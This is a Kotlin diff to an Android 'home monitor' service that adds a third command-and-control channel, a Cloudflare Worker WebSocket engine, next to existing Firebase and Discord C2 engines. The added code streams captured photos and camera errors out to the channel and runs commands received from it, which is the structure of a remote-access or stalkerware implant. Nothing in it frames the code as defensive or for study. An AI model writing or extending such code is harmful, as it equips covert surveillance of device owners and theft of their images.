@@ -223,6 +223,7 @@ class MonitorService : LifecycleService() {
                     put("timestamp", System.currentTimeMillis())
                 }
                 com.homemonitor.DeviceApiDispatcher(inst).dispatchStreamEvent(inst.webRtcEngine, "photos.stream", eventPayload)
+                CloudflareWorkerWebSocketEngine.sendWebSocketStreamEvent("photos.stream", eventPayload)
             }
         }
 
@@ -236,6 +237,7 @@ class MonitorService : LifecycleService() {
                     put("timestamp", System.currentTimeMillis())
                 }
                 com.homemonitor.DeviceApiDispatcher(inst).dispatchStreamEvent(inst.webRtcEngine, "camera.error", eventPayload)
+                CloudflareWorkerWebSocketEngine.sendWebSocketStreamEvent("camera.error", eventPayload)
             }
         }
 
@@ -334,6 +336,7 @@ class MonitorService : LifecycleService() {
 
     @Volatile var firebaseC2Engine: FirebaseC2Engine? = null
     @Volatile var discordC2Engine: DiscordC2Engine? = null
+    @Volatile var cloudflareWorkerWebSocketEngine: CloudflareWorkerWebSocketEngine? = null
     @Volatile var webRtcEngine: WebRtcEngine? = null
     @Volatile var signalingRepository: FirebaseSignalingRepository? = null
 
@@ -473,6 +476,13 @@ class MonitorService : LifecycleService() {
                     httpClient = httpClient,
                     scope = serviceScope,
                     commandDispatcher = { channelId, cmd -> handleCommand(cmd, "discord_$channelId") }
+                ).apply { startEngine() }
+
+                cloudflareWorkerWebSocketEngine = CloudflareWorkerWebSocketEngine(
+                    context = this@MonitorService,
+                    httpClient = httpClient,
+                    scope = serviceScope,
+                    commandDispatcher = { tag, cmd -> handleCommand(cmd, tag) }
                 ).apply { startEngine() }
 
                 val fbEngine = firebaseC2Engine ?: return@launch
